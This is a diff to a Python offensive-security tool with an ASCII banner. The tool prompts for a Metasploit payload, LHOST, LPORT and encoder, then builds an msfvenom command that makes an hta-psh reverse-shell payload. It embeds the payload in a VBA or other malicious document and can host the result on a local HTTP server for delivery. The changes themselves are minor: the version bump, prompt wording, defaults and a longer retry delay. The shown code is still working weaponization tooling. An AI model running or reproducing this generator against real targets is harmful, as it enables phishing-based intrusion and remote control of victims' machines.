@@ -13,7 +13,7 @@ cwd = os.getcwd()
 sys.path.insert(0, "{}/packages".format(cwd))
 from prompt_toolkit import prompt
 
-version = '\033[3m{}\033[0m'.format('V1.0.1')
+version = '\033[3m{}\033[0m'.format('V1.0.2')
 banner = (f"""
     __  ________   ________________  __  ________
    /  |/  /  _/ | / /  _/_  __/ __ \/ / / / ____/
@@ -53,12 +53,12 @@ def main():
     global filename
     global lhost
     interfaces = w_com(get_interfaces())
-    payload = prompter('[*] Select a payload: ', payloads)
-    mode = prompter('[*] Select the payload type: ', modes)
-    lhost = prompter('[*] LHOST=', interfaces).split()
-    lport = prompter('[*] LPORT=', ports)
-    encoder = prompter('[*] Payload encoder: ', encoders)
-    filename = prompter('[?] Select or enter file name (without extensions): ', filenames)
+    payload = prompter('[*] Payload (selection): ', payloads)
+    mode = prompter('[*] Payload type (selection): ', modes)
+    lhost = prompter('[*] LHOST (selection/custom): ', interfaces).split()
+    lport = prompter('[*] LPORT (selection/custom): ', ports)
+    encoder = prompter('[*] Payload encoder (selection - defaults to None): ', encoders)
+    filename = prompter('[?] Filename (selection/custom - without extensions; defaults to "report"): ', filenames)
     platform = payload.split('/')[0]
     arch_group = payload.split('/')[1]
 
@@ -68,8 +68,10 @@ def main():
         arch = arch_group
 
     cmd = 'msfvenom -p {} lhost={} lport={} -f hta-psh --platform {} -a {}'
+    if len(lhost) < 2:
+        lhost.insert(1, 'generic')
     cmd = cmd.format(payload, lhost[0], lport, platform, arch) \
-            if encoder == 'None' \
+            if (encoder == 'None' or not encoder) \
             else 'msfvenom -p {} lhost={} lport={} -e {} -f hta-psh --platform {} -a {}'.\
             format(payload, lhost[0], lport, encoder, platform, arch)
     print('\n[+] Generating payload with: {}\n\n[!] This might take a moment...\n'.format(cmd))
@@ -95,8 +97,8 @@ if __name__ == '__main__':
     ret_filename = doc_gen(final_payload, 1, filename) if 'VBA' in mode \
             else doc_gen(final_payload, 2, filename)
     try:
-        srv_port = prompter('[?] Start simple HTTP server hosting output directory? (Select an option or specify port number) ', srv_ports)
-        if srv_port != 'No':
+        srv_port = prompter('[?] Start simple HTTP server hosting output directory? (selection/custom - defaults to No) ', srv_ports)
+        if srv_port not in ['No', '']:
             PORT = int(srv_port.split()[-1]) if 'Yes' in srv_port else int(srv_port.strip())
             try:
                 serve(PORT, '{}/output'.format(cwd), lhost[1][1:-1], ret_filename)
@@ -104,13 +106,13 @@ if __name__ == '__main__':
                 print('\n[-] Received SIGINT. Quitting')
                 exit()
             except OSError:
-                    print('\n[-] Port {} is currently in use. Retrying in 10s...'.\
+                    print('\n[-] Port {} is currently in use. Retrying in 20s...'.\
                             format(srv_port.split()[-1]))
                     from time import sleep
                     from prompt_toolkit.shortcuts import ProgressBar
                     try:
                         with ProgressBar() as pb:
-                            for i in pb(range(10), label='[!] Retrying: '):
+                            for i in pb(range(20), label='[!] Retrying: '):
                                 sleep(1)
                         serve(PORT, '{}/output'.format(cwd), lhost[1][1:-1], ret_filename)
                     except KeyboardInterrupt:
